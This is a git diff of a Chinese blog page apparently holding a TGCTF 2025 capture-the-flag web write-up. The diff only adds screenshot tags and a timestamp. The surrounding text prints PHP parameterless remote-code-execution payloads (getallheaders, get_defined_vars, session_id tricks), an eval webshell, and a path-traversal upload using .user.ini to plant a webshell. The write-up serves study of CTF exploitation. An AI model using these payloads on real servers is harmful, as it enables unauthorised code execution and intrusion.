@@ -1744,7 +1744,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1744889566741),
+    lastupdate: new Date(1744889735095),
     sidebar: {
       for_page: ["blogger","category","tagcloud","donate"],
       for_post: ["toc"],
@@ -2592,13 +2592,13 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>但是注意到过滤的括号为中文括号，我们可以使用无参rce，通过利用各种函数去构造路径去访问flag</p>
 <p>paylaod:</p>
 <p>1.使用getallheaders()通过请求头中自定义xff 去传递命令</p>
-
+<img src="/2025/04/13/TGCTF/image-20250413161210761.png" class="lazyload" data-srcset="/2025/04/13/TGCTF/image-20250413161210761.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250413161210761">
 
 <p>我们使用next()函数去获取到我们xff(我发现一个很奇怪的地方，这足以说明我这个解不是预期解，但是又有点牛逼，可以通过请求头自定义参数)</p>
 <p>我们先传入</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">getallheaders</span>());</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2025/04/13/TGCTF/image-20250415161953640.png" class="lazyload" data-srcset="/2025/04/13/TGCTF/image-20250415161953640.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250415161953640">
 
 <p>返回的是一个数组，本来这么多值可以用，随便写，但是就在于我不能随便确定它的排序顺序，一开始我是用xxf写出来的但现在怎么都不行</p>
 <p>不同服务器环境下 <code>getallheaders()</code> 返回的数组顺序不同：</p>
@@ -2610,7 +2610,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>但是这次是nginx，是根据字母排序的，事实也是如此，我们直接利用content-type</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">getallheaders</span>()));</span><br><span class="line">content-type=cat /flag</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2025/04/13/TGCTF/image-20250415162531121.png" class="lazyload" data-srcset="/2025/04/13/TGCTF/image-20250415162531121.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250415162531121">
 
 
 
@@ -2621,7 +2621,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>我们先来看下get_defined_vars()返回什么</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?tgctf2025=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">get_defined_vars</span>());&amp;b=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2025/04/13/TGCTF/image-20250415163853441.png" class="lazyload" data-srcset="/2025/04/13/TGCTF/image-20250415163853441.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250415163853441">
 
 <p>可以看到，我们的参数被放在第一个_GET数组里面，我们先选中_GET再用next输出命令执行代码，然后再用eval执行也可以</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?tgctf2025=<span class="keyword">eval</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())));&amp;b=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br></pre></td></tr></table></figure>
@@ -2631,7 +2631,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <p>我们先挨个看题目</p>
 <h3 id="1-tgupload-php"><a href="#1-tgupload-php" class="headerlink" title="1.tgupload.php"></a>1.tgupload.php</h3><p>文件上传，但是无论什么文件都不能上传</p>
-
+<img src="/2025/04/13/TGCTF/image-20250413163729362.png" class="lazyload" data-srcset="/2025/04/13/TGCTF/image-20250413163729362.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250413163729362">
 
 <hr>
 <h3 id="2-tgshell-php"><a href="#2-tgshell-php" class="headerlink" title="2.tgshell.php"></a>2.tgshell.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$shell</span>=<span class="variable">$_POST</span>[<span class="string">&quot;shell&quot;</span>];</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$shell</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -2700,7 +2700,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
 
-
+<img src="/2025/04/13/TGCTF/image-20250413212929630.png" class="lazyload" data-srcset="/2025/04/13/TGCTF/image-20250413212929630.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250413212929630">
 
 
 
@@ -2725,18 +2725,18 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>注意到可传入name参数来控制文件名，同时basename并没有对name参数进行清洗，$img_path是由文件名直接拼接得到，存在目录穿越漏洞，因此我们可以将文件上传到&#x2F;var&#x2F;www&#x2F;html目录中，配合<code>.user.ini</code>实现对非<code>.php</code>文件的解析，上线webshell：</p>
 <p>我们知道文件保存路径为<code>/var/www/html/uploads/</code>在html根目录下有php文件。我们两次上传文本马和.user.ini即可</p>
 <p>先上传.user.ini</p>
-
+<img src="/2025/04/13/TGCTF/image-20250415155442250.png" class="lazyload" data-srcset="/2025/04/13/TGCTF/image-20250415155442250.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250415155442250">
 
 <p>在上传door.txt到目录下即可</p>
-
+<img src="/2025/04/13/TGCTF/image-20250415155705060.png" class="lazyload" data-srcset="/2025/04/13/TGCTF/image-20250415155705060.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250415155705060">
 
 <p>不用管那个报错，我们上传成功了</p>
-
+<img src="/2025/04/13/TGCTF/image-20250415155741623.png" class="lazyload" data-srcset="/2025/04/13/TGCTF/image-20250415155741623.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250415155741623">
 
 <p>然后我们直接使用蚁剑连接即可，回来了发现flag没有放在根目录下，我根本找不到，看了大佬的才知道</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pass=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;env&#x27;</span>);</span><br><span class="line"><span class="comment">//env 命令会显示当前进程的所有环境变量</span></span><br></pre></td></tr></table></figure>
 
-
+<img src="/2025/04/13/TGCTF/image-20250415160340947.png" class="lazyload" data-srcset="/2025/04/13/TGCTF/image-20250415160340947.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250415160340947">
 
 
 
@@ -2749,7 +2749,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?tgctf2025=<span class="title function_ invoke__">session_start</span>();<span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">session_id</span>()));</span><br><span class="line">PHPSESSID=<span class="number">636174202</span>f666c6167       <span class="comment">//cat /flag的十六进制</span></span><br></pre></td></tr></table></figure>
 
 <p><code>session_start();</code>后请求头中就多了PHPSESSID这个参数，原来是服务器用了识别用户的，但是我们这里可以用session_id()来获取到我们请求头传递到的cookie中的PHPSESSIONID</p>
-
+<img src="/2025/04/13/TGCTF/image-20250415170439832.png" class="lazyload" data-srcset="/2025/04/13/TGCTF/image-20250415170439832.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250415170439832">
 
 <p>虽然过滤掉了我认识的函数，但肯定还有非预期解</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?tgctf2025=<span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">implode</span>(<span class="title function_ invoke__">apache_request_headers</span>()));</span><br></pre></td></tr></table></figure>
@@ -2766,7 +2766,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>由于为了方便尝试，我用的是原版的，那样可以用var_dump()看数组，这里面比如Host不能为空，有一些项能为空但不能删除，不然会自动触发content-length</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">GET /?tgctf2025=system(implode(apache_request_headers())); HTTP/1.1</span><br><span class="line">Host:  g</span><br><span class="line">User-Agent: </span><br><span class="line">Accept: a</span><br><span class="line">Accept-Language:  l</span><br><span class="line">Accept-Encoding: f</span><br><span class="line">Connection: /</span><br><span class="line">Upgrade-Insecure-Requests:$&#123;IFS&#125;</span><br><span class="line">Sec-Fetch-Dest: t</span><br><span class="line">Sec-Fetch-Mode:a </span><br><span class="line">Sec-Fetch-Site: c</span><br><span class="line">Content-Type: </span><br><span class="line">Sec-Fetch-User: </span><br><span class="line">Priority: </span><br><span class="line">Pragma: </span><br><span class="line">Cache-Control: </span><br></pre></td></tr></table></figure>
 
-
+<img src="/2025/04/13/TGCTF/image-20250415212411344.png" class="lazyload" data-srcset="/2025/04/13/TGCTF/image-20250415212411344.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250415212411344">
 
 <p>还有就是这个排列顺序的问题，就是我用apache_request_headers()的时候他用的是apache的发送的原始顺序返回，但是当我用getallheaders()的时候则是以nginx的字母排序</p>
 <h2 id="6-前端GAME"><a href="#6-前端GAME" class="headerlink" title="6.前端GAME"></a>6.前端GAME</h2><p>和这题目比起来，其他题目算好的了，没学过的东西果然一点思路都没有</p>
